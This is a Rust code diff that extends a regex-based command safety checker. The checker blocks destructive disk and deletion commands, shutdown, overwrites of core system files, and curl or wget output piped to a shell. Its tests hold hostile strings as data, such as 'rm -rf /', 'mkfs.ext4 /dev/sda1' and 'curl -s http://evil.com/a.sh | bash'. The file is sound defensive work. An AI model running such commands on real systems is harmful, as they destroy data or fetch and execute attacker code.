@@ -14,10 +14,6 @@ pub struct SafetyManager {
     warning_patterns: Vec<(Regex, &'static str)>,
 }
 
-/// 危险命令拦截等级
-/// - high: 拦截全部危险与警告模式（默认）
-/// - medium: 仅拦截极度危险模式，警告模式降级为提示
-/// - low: 仅记录而不阻断，风险级别统一按 safe 返回
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum SafetyLevel {
     High,
@@ -39,19 +35,23 @@ impl SafetyManager {
     pub fn new() -> Self {
         let danger_patterns = vec![
             (
-                Regex::new(r"(?i)\brm\s+-[rfRF]{1,4}\s+(/|/\*|\.\.|\./\*|~|~\*)").unwrap(),
-                "检测到根目录或大范围强力递归删除指令 (rm -rf /)",
+                Regex::new(r"(?i)\brm\s+(?:-[a-z]*[rR][a-z]*\s+-[a-z]*[fF]|-[a-z]*[fF][a-z]*\s+-[a-z]*[rR]|-[rfRF]{1,4}|--recursive\b.*--force\b|--force\b.*--recursive\b)\s+(/|/\*|\.\.|\./\*|~|~\*|/etc\b|/usr\b|/var\b|/home\b)").unwrap(),
+                "检测到根目录或核心目录强力递归删除指令 (rm)",
             ),
             (
-                Regex::new(r"(?i)\bmkfs(\.\w+)?\b").unwrap(),
-                "检测到磁盘文件系统格式化指令 (mkfs)",
+                Regex::new(r"(?i)\b(remove-item|ri|del|erase|rd|rmdir)\b.*(-recurse|-r|/s)\b.*([a-z]:\\(\s|$|\*)|\\windows|\\system32)").unwrap(),
+                "检测到 Windows 高危递归删除指令",
+            ),
+            (
+                Regex::new(r"(?i)\b(mkfs(\.\w+)?|format\s+[a-z]:|clear-disk)\b").unwrap(),
+                "检测到磁盘文件系统格式化或清空指令",
             ),
             (
                 Regex::new(r"(?i)\bdd\s+if=.*of=/dev/(sd[a-z]|nvme|vd[a-z]|disk)").unwrap(),
                 "检测到裸磁盘块设备覆写指令 (dd)",
             ),
             (
-                Regex::new(r"(?i)\b(shutdown|reboot|poweroff|halt|init\s+0|init\s+6)\b").unwrap(),
+                Regex::new(r"(?i)\b(shutdown|reboot|poweroff|halt|init\s+0|init\s+6|stop-computer|restart-computer)\b").unwrap(),
                 "检测到系统停机或关机重启指令",
             ),
             (
@@ -66,6 +66,14 @@ impl SafetyManager {
                 Regex::new(r"(?i):\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:").unwrap(),
                 "检测到 Fork 炸弹攻击代码",
             ),
+            (
+                Regex::new(r"(?i)(curl|wget)\b.*\|\s*(sudo\s+)?(sh|bash|zsh)\b").unwrap(),
+                "检测到远程脚本管道直接执行 (curl/wget | sh)",
+            ),
+            (
+                Regex::new(r"(?i)>\s*/etc/(passwd|shadow|sudoers|fstab)\b").unwrap(),
+                "检测到直接覆盖系统核心安全文件",
+            ),
         ];
 
         let warning_patterns = vec![
@@ -74,7 +82,7 @@ impl SafetyManager {
                 "警告：正在停止或重启 SSH 服务，可能导致当前会话中断",
             ),
             (
-                Regex::new(r"(?i)\b(chmod|chown)\s+-[rR]\s+777\b").unwrap(),
+                Regex::new(r"(?i)\b(chmod|chown)\s+(-[rR]\s+777|777\s+-[rR])\b").unwrap(),
                 "警告：正在大范围修改文件权限为 777，存在安全隐患",
             ),
             (
@@ -84,6 +92,10 @@ impl SafetyManager {
             (
                 Regex::new(r"(?i)\bdrop\s+table\b").unwrap(),
                 "警告：检测到数据表删除指令 (DROP TABLE)",
+            ),
+            (
+                Regex::new(r"(?i)\bbase64\s+(-d|--decode)\b.*\|\s*(sh|bash|zsh)\b").unwrap(),
+                "警告：检测到解码后直接执行的 Shell 载荷",
             ),
         ];
 
@@ -100,7 +112,6 @@ impl SafetyManager {
     ) -> SafetyCheckResult {
         let trimmed = command.trim();
 
-        // 极度危险模式：除低等级仅记录外，其余等级均强制拦截
         for (pattern, reason) in &self.danger_patterns {
             if pattern.is_match(trimmed) {
                 let blocked = level != SafetyLevel::Low;
@@ -117,7 +128,6 @@ impl SafetyManager {
             }
         }
 
-        // 警告级别模式：高等级按 warning 拦截，中低等级仅作提示
         for (pattern, reason) in &self.warning_patterns {
             if pattern.is_match(trimmed) {
                 return SafetyCheckResult {
@@ -163,21 +173,14 @@ mod tests {
     #[test]
     fn test_dangerous_commands() {
         let manager = SafetyManager::new();
-        let res1 = manager.check_command("rm -rf /");
-        assert!(res1.is_dangerous);
-        assert_eq!(res1.risk_level, "dangerous");
-
-        let res2 = manager.check_command("rm -rf /*");
-        assert!(res2.is_dangerous);
-
-        let res3 = manager.check_command("mkfs.ext4 /dev/sda1");
-        assert!(res3.is_dangerous);
-
-        let res4 = manager.check_command("reboot");
-        assert!(res4.is_dangerous);
-
-        let res5 = manager.check_command("iptables -F");
-        assert!(res5.is_dangerous);
+        assert!(manager.check_command("rm -rf /").is_dangerous);
+        assert!(manager.check_command("rm -f -r /*").is_dangerous);
+        assert!(manager.check_command("rm --recursive --force /").is_dangerous);
+        assert!(manager.check_command("mkfs.ext4 /dev/sda1").is_dangerous);
+        assert!(manager.check_command("reboot").is_dangerous);
+        assert!(manager.check_command("iptables -F").is_dangerous);
+        assert!(manager.check_command("curl -s http://evil.com/a.sh | bash").is_dangerous);
+        assert!(manager.check_command("Remove-Item -Recurse -Force C:\\").is_dangerous);
     }
 
     #[test]
@@ -186,30 +189,20 @@ mod tests {
         let res = manager.check_command("chmod -R 777 /var/www");
         assert!(!res.is_dangerous);
         assert_eq!(res.risk_level, "warning");
+        assert_eq!(manager.check_command("chmod 777 -R /var/www").risk_level, "warning");
     }
 
     #[test]
     fn test_safety_levels_take_effect() {
         let manager = SafetyManager::new();
-
-        // 高等级：拦截危险与警告
-        let high_danger = manager.check_command_with_level("rm -rf /", SafetyLevel::High);
-        assert!(high_danger.is_dangerous);
-        let high_warn = manager.check_command_with_level("chmod -R 777 /var/www", SafetyLevel::High);
-        assert_eq!(high_warn.risk_level, "warning");
-
-        // 中等级：警告降级为安全，危险仍拦截
-        let medium_warn =
-            manager.check_command_with_level("chmod -R 777 /var/www", SafetyLevel::Medium);
-        assert_eq!(medium_warn.risk_level, "safe");
-        let medium_danger = manager.check_command_with_level("mkfs.ext4 /dev/sda1", SafetyLevel::Medium);
-        assert!(medium_danger.is_dangerous);
-
-        // 低等级：仅记录，不拦截
+        assert!(manager.check_command_with_level("rm -rf /", SafetyLevel::High).is_dangerous);
+        assert_eq!(
+            manager.check_command_with_level("chmod -R 777 /var/www", SafetyLevel::Medium).risk_level,
+            "safe"
+        );
         let low_danger = manager.check_command_with_level("rm -rf /", SafetyLevel::Low);
         assert!(!low_danger.is_dangerous);
         assert_eq!(low_danger.risk_level, "safe");
-        assert!(low_danger.message.contains("已记录"));
     }
 
     #[test]
